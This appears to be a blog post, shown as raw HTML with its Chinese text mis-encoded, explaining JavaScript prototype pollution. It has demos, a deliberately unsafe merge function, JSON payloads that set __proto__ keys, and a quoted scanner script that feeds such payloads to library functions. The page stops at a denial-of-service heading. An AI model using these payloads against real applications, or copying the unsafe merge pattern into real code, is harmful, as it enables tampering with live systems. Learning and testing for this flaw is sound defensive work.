

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Yu ting">
  <meta name="keywords" content="">
  <title>jsåŸå‹é“¾æ±¡æŸ“ - liquor&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
  



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="liquor's blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="jsåŸå‹é“¾æ±¡æŸ“">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-04-18 15:22" pubdate>
        April 18, 2021 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      3.8k å­—
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      58
       åˆ†é’Ÿ
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">jsåŸå‹é“¾æ±¡æŸ“</h1>
            
            <div class="markdown-body">
              <h2 id="javascript-å›é¡¾"><a class="header-anchor" href="#javascript-å›é¡¾">ğŸ­</a>javascript å›é¡¾</h2>
<blockquote>
<p>åœ¨javascriptä¸­ï¼Œç»§æ‰¿çš„æ•´ä¸ªè¿‡ç¨‹å°±ç§°ä¸ºè¯¥ç±»çš„åŸå‹é“¾ã€‚</p>
</blockquote>
<blockquote>
<p>æ¯ä¸ªå¯¹è±¡çš„éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘ä»–çš„åŸå‹(prototype)çš„å†…éƒ¨é“¾æ¥ï¼Œè¿™ä¸ªåŸå‹å¯¹è±¡åˆæœ‰å®ƒè‡ªå·±çš„åŸå‹ï¼Œä¸€ç›´åˆ°nullä¸ºæ­¢ã€‚</p>
</blockquote>
<blockquote>
<p><strong>åœ¨javascriptä¸­ä¸€åˆ‡çš†å¯¹è±¡</strong>ï¼Œå› ä¸ºæ‰€æœ‰çš„å˜é‡ï¼Œå‡½æ•°ï¼Œæ•°ç»„ï¼Œå¯¹è±¡ éƒ½å§‹äºobjectçš„åŸå‹å³object.prototypeï¼Œä½†åªæœ‰ç±»æœ‰å¯¹è±¡ï¼Œå¯¹è±¡æ²¡æœ‰ï¼Œå¯¹è±¡æœ‰çš„æ˜¯<code>__proto__</code>ï¼Œå’Œç±»çš„prototypeå¯¹åº”ï¼Œä¸”äºŒè€…ç­‰ä»·ã€‚</p>
</blockquote>
<blockquote>
<p>ç±»æ˜¯é€šè¿‡å‡½æ•°æ¥å®šä¹‰çš„,å®šä¹‰çš„è¿™ä¸ªå‡½æ•°åˆæ˜¯è¿™ä¸ªç±»çš„<code>constructor</code>å±æ€§å€¼,</p>
</blockquote>
<blockquote>
<p>å­ç±»æ˜¯å¯ä»¥é€šè¿‡prototypeé“¾ä¿®æ”¹å…¶çˆ¶ç±»ä»¥åŠç¥–çˆ¶ç±»çš„å±æ€§å€¼ã€‚</p>
</blockquote>
<h4 id="ç»§æ‰¿æœºåˆ¶ï¼šprototypeåŸå‹é“¾"><a class="header-anchor" href="#ç»§æ‰¿æœºåˆ¶ï¼šprototypeåŸå‹é“¾">ğŸ­</a>ç»§æ‰¿æœºåˆ¶ï¼šprototypeåŸå‹é“¾</h4>
<p>æ—¥æœŸï¼š</p>
<pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">f</span> -&gt;</span> D<span class="hljs-function"><span class="hljs-title">ata</span>.prototype -&gt;</span> <span class="hljs-function"><span class="hljs-title">object</span>.prototype-&gt;</span>null</code></pre>
<p>å‡½æ•°ï¼š</p>
<pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">d</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">function</span>.prototype -&gt;</span> <span class="hljs-function"><span class="hljs-title">object</span>.prototype-&gt;</span>null</code></pre>
<p>æ•°ç»„ï¼š</p>
<pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">c</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">array</span>.prototype -&gt;</span> <span class="hljs-function"><span class="hljs-title">object</span>.prototype-&gt;</span>null</code></pre>
<p>ç±»ï¼š</p>
<pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">b</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">a</span>.prototype -&gt;</span> <span class="hljs-function"><span class="hljs-title">object</span>.prototype-&gt;</span>null</code></pre>
<p>å½“è¦ä½¿ç”¨æˆ–è¾“å‡ºä¸€ä¸ªå˜é‡æ—¶ï¼šé¦–å…ˆä¼šåœ¨æœ¬å±‚ä¸­æœç´¢ç›¸åº”çš„å˜é‡ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šå‘ä¸Šæœç´¢ï¼Œå³åœ¨è‡ªå·±çš„çˆ¶ç±»ä¸­æœç´¢ï¼Œå½“çˆ¶ç±»ä¸­ä¹Ÿæ²¡æœ‰æ—¶ï¼Œå°±ä¼šå‘ç¥–çˆ¶ç±»æœç´¢ï¼Œç›´åˆ°æŒ‡å‘nullï¼Œå¦‚æœæ­¤æ—¶è¿˜æ²¡æœ‰æœç´¢åˆ°ï¼Œå°±ä¼šè¿”å› undefinedã€‚</p>
<pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">i</span>(<span class="hljs-params"></span>)</span>&#123;
    <span class="hljs-built_in">this</span>.a = <span class="hljs-string">&quot;test1&quot;</span>;
    <span class="hljs-built_in">this</span>.b = <span class="hljs-string">&quot;test2&quot;</span>;&#125;</code></pre>
<p><img src="/2021/04/18/js/1.png" srcset="/img/loading.gif" alt="1"></p>
<p>å…¶çˆ¶ç±»ä¸ºobjectï¼Œä¸”é‡Œé¢è¿˜æœ‰è®¸å¤šå‡½æ•°ã€‚</p>
<h2 id="åŸå‹é“¾æ±¡æŸ“"><a class="header-anchor" href="#åŸå‹é“¾æ±¡æŸ“">ğŸ­</a>åŸå‹é“¾æ±¡æŸ“</h2>
<p>demoï¼š</p>
<pre><code class="hljs awk"><span class="hljs-regexp">//</span> fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡
let foo = &#123;bar: <span class="hljs-number">1</span>&#125;

<span class="hljs-regexp">//</span> foo.bar æ­¤æ—¶ä¸º<span class="hljs-number">1</span>
console.log(foo.bar)

<span class="hljs-regexp">//</span> ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰
foo.__proto__.bar = <span class="hljs-number">2</span>

<span class="hljs-regexp">//</span> ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯<span class="hljs-number">1</span>
console.log(foo.bar)

<span class="hljs-regexp">//</span> æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡
let zoo = &#123;&#125;

<span class="hljs-regexp">//</span> æŸ¥çœ‹zoo.bar
console.log(zoo.bar)</code></pre>
<p>æœ€ç»ˆzoo.barçš„ç»“æœä¸º2;å› ä¸ºå‰é¢ä¿®æ”¹äº†fooçš„åŸå‹<code>foo.__proto__.bar = 2</code>ï¼Œè€Œfooæ˜¯ä¸€ä¸ªObjectç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å®é™…ä¸Šæ˜¯ä¿®æ”¹äº†Objectè¿™ä¸ªç±»ï¼Œç»™è¿™ä¸ªç±»å¢åŠ äº†ä¸€ä¸ªå±æ€§barï¼Œå€¼ä¸º2ã€‚åæ¥ï¼Œåˆç”¨Objectç±»åˆ›å»ºäº†ä¸€ä¸ªzooå¯¹è±¡<code>let zoo = &#123;&#125;</code>ï¼Œzooå¯¹è±¡è‡ªç„¶ä¹Ÿæœ‰ä¸€ä¸ªbarå±æ€§äº†ã€‚åœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯<strong>åŸå‹é“¾æ±¡æŸ“</strong>ã€‚</p>
<h2 id="åŸå‹é“¾æ±¡æŸ“å®ä¾‹"><a class="header-anchor" href="#åŸå‹é“¾æ±¡æŸ“å®ä¾‹">ğŸ­</a>åŸå‹é“¾æ±¡æŸ“å®ä¾‹</h2>
<p>åŸå‹é“¾æ±¡æŸ“ä¸€èˆ¬ä¼šå‡ºç°åœ¨å¯¹è±¡ã€æˆ–æ•°ç»„çš„é”®åæˆ–å±æ€§åå¯æ§,è€Œä¸”æ˜¯èµ‹å€¼è¯­å¥çš„æƒ…å†µä¸‹ã€‚</p>
<h3 id="ä¸€èˆ¬æƒ…å†µ"><a class="header-anchor" href="#ä¸€èˆ¬æƒ…å†µ">ğŸ­</a>ä¸€èˆ¬æƒ…å†µ</h3>
<pre><code class="hljs js">obj[a][b] = value
obj[a][b][c] = value
<span class="hljs-number">12</span></code></pre>
<p>å¦‚æœæ§åˆ¶äº†a,b,cåŠvalueå°±å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“çš„æ”»å‡»,å¯ä»¥æ§åˆ¶<code>a=__proto__</code></p>
<h3 id="åˆ©ç”¨æŸäº›APIæ¥è¿›è¡Œæ”»å‡»"><a class="header-anchor" href="#åˆ©ç”¨æŸäº›APIæ¥è¿›è¡Œæ”»å‡»">ğŸ­</a>åˆ©ç”¨æŸäº›APIæ¥è¿›è¡Œæ”»å‡»</h3>
<h4 id="å…¸å‹mergeæ“ä½œ"><a class="header-anchor" href="#å…¸å‹mergeæ“ä½œ">ğŸ­</a>å…¸å‹mergeæ“ä½œ</h4>
<ul>
<li>å¯¹è±¡merge</li>
<li>å¯¹è±¡cloneï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰</li>
</ul>
<p>ä»¥å¯¹è±¡mergeä¸ºä¾‹ï¼š</p>
<pre><code class="hljs sql">function <span class="hljs-keyword">merge</span>(target, <span class="hljs-keyword">source</span>) &#123;
    <span class="hljs-keyword">for</span> (let <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">source</span>) &#123;
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">source</span> &amp;&amp; <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> target) &#123;
            <span class="hljs-keyword">merge</span>(target[<span class="hljs-keyword">key</span>], <span class="hljs-keyword">source</span>[<span class="hljs-keyword">key</span>])
        &#125; <span class="hljs-keyword">else</span> &#123;
            target[<span class="hljs-keyword">key</span>] = <span class="hljs-keyword">source</span>[<span class="hljs-keyword">key</span>]
        &#125;
    &#125;
&#125;</code></pre>
<p>åœ¨åˆå¹¶çš„è¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨èµ‹å€¼çš„æ“ä½œ<code>target[key] = source[key]</code>ï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ªkeyå¦‚æœæ˜¯<code>__proto__</code>ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥åŸå‹é“¾æ±¡æŸ“å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬å¯¹æ¯”ä¸€ä¸‹ä¸‹é¢ä¸¤ä¸ªdemoï¼š</p>
<p>demo1ï¼š</p>
<pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125;
<span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = &#123;a: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;b: <span class="hljs-number">2</span>&#125;&#125;
<span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>)
<span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b)

<span class="hljs-attribute">o3</span> = &#123;&#125;
<span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)</code></pre>
<p>demo2:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125;
<span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = JSON.parse(&#x27;&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;&#x27;)
<span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>)
<span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b)

<span class="hljs-attribute">o3</span> = &#123;&#125;
<span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)</code></pre>
<p>demo1ä¸­åŸå‹é“¾ä¸ä¼šè¢«æ±¡æŸ“ï¼Œå› ä¸ºï¼Œæˆ‘ä»¬ç”¨JavaScriptåˆ›å»ºo2çš„è¿‡ç¨‹ï¼ˆ<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>ï¼‰ä¸­ï¼Œ<code>__proto__</code>å·²ç»ä»£è¡¨o2çš„åŸå‹äº†ï¼Œæ­¤æ—¶éå†o2çš„æ‰€æœ‰é”®åï¼Œæˆ‘ä»¬æ‹¿åˆ°çš„æ˜¯<code>[a, b]</code>ï¼Œ<code>__proto__</code>å¹¶ä¸æ˜¯ä¸€ä¸ªkeyï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šä¿®æ”¹Objectçš„åŸå‹ã€‚</p>
<p>è€Œdemo2åœ¨JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†o2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ï¼Œæ•…Objectå·²ç»è¢«æ±¡æŸ“ã€‚</p>
<h4 id="Property-definition-by-path"><a class="header-anchor" href="#Property-definition-by-path">ğŸ­</a>Property definition by path</h4>
<pre><code class="hljs reasonml">the<span class="hljs-constructor">Function(<span class="hljs-params">object</span>, <span class="hljs-params">path</span>, <span class="hljs-params">value</span>)</span></code></pre>
<p>å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶path,å¦‚path=<strong>proto</strong>.myValue.å°±å¯ä»¥è¿›è¡Œæ±¡æŸ“</p>
<h4 id="Object-clone"><a class="header-anchor" href="#Object-clone">ğŸ­</a>Object clone</h4>
<pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span>(obj) &#123;
	<span class="hljs-keyword">return</span> <span class="hljs-type">merge(&#123;&#125;,</span> obj);
&#125;</code></pre>
<h3 id="æ‰¾å‡ºæ˜“å—æ”»å‡»çš„API"><a class="header-anchor" href="#æ‰¾å‡ºæ˜“å—æ”»å‡»çš„API">ğŸ­</a>æ‰¾å‡ºæ˜“å—æ”»å‡»çš„API</h3>
<p>node xx.js library-name</p>
<pre><code class="hljs javascript">
<span class="hljs-keyword">var</span> process = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;process&#x27;</span>);

<span class="hljs-comment">//checkæ˜¯å¦æ”¶åˆ°æ±¡æŸ“</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>) </span>&#123;
	<span class="hljs-keyword">if</span> (&#123;&#125;.test == <span class="hljs-string">&quot;123&quot;</span> || &#123;&#125;.test == <span class="hljs-number">123</span>) &#123;
		<span class="hljs-keyword">delete</span> <span class="hljs-built_in">Object</span>.prototype.test;
		<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params">fnct, sig, name, totest</span>) </span>&#123;
	<span class="hljs-comment">// Reinitialize to avoid issue if the previous function changed attributes.</span>
	BAD_JSON = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;test&quot;:123&#125;&#125;&#x27;</span>);

	<span class="hljs-keyword">try</span> &#123;
		fnct(totest);
	&#125; <span class="hljs-keyword">catch</span> (e) &#123;&#125;
	
	<span class="hljs-keyword">if</span> (check()) &#123;
		<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Detected : &quot;</span> + name + <span class="hljs-string">&quot; (&quot;</span> + sig + <span class="hljs-string">&quot;)&quot;</span>);
	&#125;
&#125;

<span class="hljs-keyword">var</span> BAD_JSON = &#123;&#125;;<span class="hljs-comment">//NULL OBJ</span>
<span class="hljs-keyword">var</span> args = process.argv.slice(<span class="hljs-number">2</span>);<span class="hljs-comment">//node xx.js param1 param2 parma3è·å–æ‰€æœ‰å‚æ•° è¿”å›æ•°ç»„[param1,param2,param3]</span>

<span class="hljs-comment">//å¿½ç•¥å¼‚å¸¸</span>
process.on(<span class="hljs-string">&#x27;uncaughtException&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>) </span>&#123; &#125;);

<span class="hljs-keyword">var</span> pattern = [&#123;
	fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;
		totest(BAD_JSON);
	&#125;,
	sig: <span class="hljs-string">&quot;function (BAD_JSON)&quot;</span>
&#125;,&#123;
	fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;
		totest(BAD_JSON, &#123;&#125;);
	&#125;,
	sig: <span class="hljs-string">&quot;function (BAD_JSON, &#123;&#125;)&quot;</span>
&#125;,&#123;
	fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;
		totest(&#123;&#125;, BAD_JSON);
	&#125;,
	sig: <span class="hljs-string">&quot;function (&#123;&#125;, BAD_JSON)&quot;</span>
&#125;,&#123;
	fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;
		totest(BAD_JSON, BAD_JSON);
	&#125;,
	sig: <span class="hljs-string">&quot;function (BAD_JSON, BAD_JSON)&quot;</span>
&#125;,&#123;
	fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;
		totest(&#123;&#125;, &#123;&#125;, BAD_JSON);
	&#125;,
	sig: <span class="hljs-string">&quot;function (&#123;&#125;, &#123;&#125;, BAD_JSON)&quot;</span>
&#125;,&#123;
	fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;
		totest(&#123;&#125;, &#123;&#125;, &#123;&#125;, BAD_JSON);
	&#125;,
	sig: <span class="hljs-string">&quot;function (&#123;&#125;, &#123;&#125;, &#123;&#125;, BAD_JSON)&quot;</span>
&#125;,&#123;
	fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;
		totest(&#123;&#125;, <span class="hljs-string">&quot;__proto__.test&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);
	&#125;,
	sig: <span class="hljs-string">&quot;function (&#123;&#125;, BAD_PATH, VALUE)&quot;</span>
&#125;,&#123;
	fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;
		totest(&#123;&#125;, <span class="hljs-string">&quot;__proto__[test]&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);
	&#125;,
	sig: <span class="hljs-string">&quot;function (&#123;&#125;, BAD_PATH, VALUE)&quot;</span>
&#125;,&#123;
	fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;
		totest(<span class="hljs-string">&quot;__proto__.test&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);
	&#125;,
	sig: <span class="hljs-string">&quot;function (BAD_PATH, VALUE)&quot;</span>
&#125;,&#123;
	fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;
		totest(<span class="hljs-string">&quot;__proto__[test]&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);
	&#125;,
	sig: <span class="hljs-string">&quot;function (BAD_PATH, VALUE)&quot;</span>
&#125;,&#123;
	fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;
		totest(&#123;&#125;, <span class="hljs-string">&quot;__proto__&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);
	&#125;,
	sig: <span class="hljs-string">&quot;function (&#123;&#125;, BAD_STRING, BAD_STRING, VALUE)&quot;</span>
&#125;,&#123;
	fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;
		totest(<span class="hljs-string">&quot;__proto__&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);
	&#125;,
	sig: <span class="hljs-string">&quot;function (BAD_STRING, BAD_STRING, VALUE)&quot;</span>
&#125;]

<span class="hljs-keyword">if</span> (args.length &lt; <span class="hljs-number">1</span>) &#123;
	<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;First argument must be the library name&quot;</span>);
	exit();
&#125;

<span class="hljs-keyword">try</span> &#123;
	<span class="hljs-keyword">var</span> lib = <span class="hljs-built_in">require</span>(args[<span class="hljs-number">0</span>]);
&#125; <span class="hljs-keyword">catch</span> (e) &#123;
	<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Missing library : &quot;</span> + args[<span class="hljs-number">0</span>] );
	exit();
&#125;

<span class="hljs-keyword">var</span> parsedObject = [];

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploreLib</span>(<span class="hljs-params">lib, prefix, depth</span>) </span>&#123;
	<span class="hljs-keyword">if</span> (depth == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;
	<span class="hljs-keyword">if</span> (parsedObject.indexOf(lib) !== <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span>;

	parsedObject.push(lib);
	
	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k <span class="hljs-keyword">in</span> lib) &#123;
		<span class="hljs-keyword">if</span> (k == <span class="hljs-string">&quot;abort&quot;</span>) <span class="hljs-keyword">continue</span>;
		<span class="hljs-keyword">if</span> (k == <span class="hljs-string">&quot;__proto__&quot;</span>) <span class="hljs-keyword">continue</span>;
		<span class="hljs-keyword">if</span> (+k == k) <span class="hljs-keyword">continue</span>;
	
		<span class="hljs-built_in">console</span>.log(k);
	
		<span class="hljs-keyword">if</span> (lib.hasOwnProperty(k)) &#123;
			<span class="hljs-keyword">for</span> (p <span class="hljs-keyword">in</span> pattern) &#123;
				<span class="hljs-keyword">if</span> (pattern.hasOwnProperty(p)) &#123;
					run(pattern[p].fnct, pattern[p].sig, prefix + <span class="hljs-string">&quot;.&quot;</span> + k, lib[k]);
				&#125;
			&#125;
	
			exploreLib(lib[k], prefix + <span class="hljs-string">&quot;.&quot;</span> + k, depth - <span class="hljs-number">1</span>);
		&#125;
	&#125;
	
	<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> lib == <span class="hljs-string">&quot;function&quot;</span>) &#123;
		<span class="hljs-keyword">for</span> (p <span class="hljs-keyword">in</span> pattern) &#123;
			<span class="hljs-keyword">if</span> (pattern.hasOwnProperty(p)) &#123;
				run(pattern[p].fnct, pattern[p].sig, args[<span class="hljs-number">0</span>], lib);
			&#125;
		&#125;
	&#125;
&#125;

exploreLib(lib, args[<span class="hljs-number">0</span>], <span class="hljs-number">5</span>);</code></pre>
<p>æ‘˜è‡ªï¼š<a target="_blank" rel="noopener" href="https://github.com/HoLyVieR/prototype-pollution-nsec18">https://github.com/HoLyVieR/prototype-pollution-nsec18</a></p>
<h2 id="åˆ©ç”¨"><a class="header-anchor" href="#åˆ©ç”¨">ğŸ­</a>åˆ©ç”¨</h2>
<h4 id="æ‹’ç»æœåŠ¡"><a class="header-anchor" href="#æ‹’ç»æœåŠ¡">ğŸ­</a>æ‹’ç»æœåŠ¡</h4>
